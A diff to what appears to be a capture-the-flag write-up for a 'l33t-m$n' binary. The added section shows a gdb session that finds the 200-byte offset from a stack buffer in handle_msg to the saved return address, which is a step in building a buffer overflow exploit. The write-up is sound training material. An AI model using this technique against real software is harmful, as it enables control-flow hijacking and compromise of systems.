@@ -31,6 +31,36 @@ Non-debugging symbols:
 ```
 We now have the correct address which is `0x000055555555488c`
 
+To get the offset of the return address we use gdb as the pattern generator don't seem to work.
+
+```bash
+(gdb) disas handle_msg
+Dump of assembler code for function handle_msg:
+...
+   0x0000555555554910 <+80>:	callq  0x5555555549cd <set_username>
+...   
+End of assembler dump.
+(gdb) b *0x0000555555554910
+Breakpoint 2 at 0x555555554910
+(gdb) c
+Continuing.
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+
+Breakpoint 2, 0x0000555555554910 in handle_msg ()
+(gdb) x/x $rbp + 8
+0x7fffffffe5d8:	0x55554abd
+(gdb) info reg rdi
+rdi            0x7fffffffe510	140737488348432
+(gdb) print rbp + 8 - rdi
+No symbol table is loaded.  Use the "file" command.
+(gdb) print $rbp + 8 - $rdi
+$1 = (void *) 0xc8
+```
+
+The difference between the buffer and the return address is `0xc8` which is `200`.
+
 ## Commands
  
 ```bash
